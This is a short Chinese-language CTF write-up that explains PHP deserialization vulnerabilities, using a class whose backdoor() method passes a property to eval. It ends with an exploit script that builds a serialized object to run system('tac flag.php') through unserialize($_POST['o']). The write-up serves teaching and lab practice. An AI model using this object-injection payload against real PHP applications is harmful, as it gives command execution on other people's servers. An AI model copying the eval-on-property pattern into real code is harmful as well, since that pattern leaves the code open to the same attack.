# WriteUP · Level 7


实例化和反序列化的演示，并且简单的展示了反序列化漏洞的原理。

从结果上来看，实例化和反序列化是一样的，这都会去创建一个对象，但是如果目标类没有构造函数，那么其中的参数控制是不同的。

在没有构造函数时，实例化中对象的各种参数在类中已经决定好了，除非创建后修改；而反序列化则是根据序列化的字符串来**"还原"**对象的 —— 这也就意味着，我们可以通过改变序列化的字符串来决定他"**还原**"对象中各种量的值。

```PHP
class FLAG{
    public $flag_command = "echo 'Hello CTF!<br>';";

    function backdoor(){
        eval($this->flag_command);
    }
}
$Unserialize_object = unserialize('O:4:"FLAG":1:{s:12:"flag_command";s:24:"echo 'Hello World!<br>';";}');
```

比如在这个代码例子中，我们可以更改 `s:24:"echo 'Hello World!<br>';"` 这个字符串来做到控制最后 `backdoor()` 函数的执行结果。

所以对于该题目中`unserialize($_POST['o'])->backdoor();`，EXP：

```PHP
<?php 
class FLAG{
    public $flag_command = "system('tac flag.php');";
}
$exp = "o=".urlencode(serialize(new FLAG()));
echo $exp;
```

